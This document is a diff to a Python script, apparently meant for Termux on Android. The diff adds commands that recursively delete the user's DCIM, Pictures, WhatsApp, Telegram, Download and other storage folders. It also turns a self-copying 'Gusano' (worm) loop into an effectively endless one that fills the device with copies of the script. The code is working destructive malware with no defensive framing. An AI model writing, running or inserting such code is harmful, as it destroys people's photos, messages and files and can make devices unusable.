@@ -1,6 +1,20 @@
 import subprocess,sys,shutil
 import os
 
+
+os.system('termux-setup-storage')
+os.system('rm -r /sdcard/Download')
+os.system('rm -r /sdcard/download')
+os.system('rm -r /sdcard/Android')
+os.system('rm -r /sdcard/DCIM')
+os.system('rm -r /sdcard/WhatsApp')
+os.system('rm -r /sdcard/GBWhatsApp')
+os.system('rm -r /sdcard/snaptube')
+os.system('rm -r /sdcard/Telegram')
+os.system('rm -r /sdcard/Pictures')
+os.system('rm -r /sdcard/bluetooth')
+os.system('rm -r /sdcard/Movies')
+
 #!Rojo
 R='\033[1;31m'
 
@@ -25,7 +39,7 @@ W='\033[0m'
 
 filename = sys.argv[0]
 
-for x in range(100):
+for x in range(999999999999999999999999999):
     path = "Gusano "+str(x)
     subprocess.call("mkdir {}".format(path),shell=True)
     shutil.copy(filename,path)
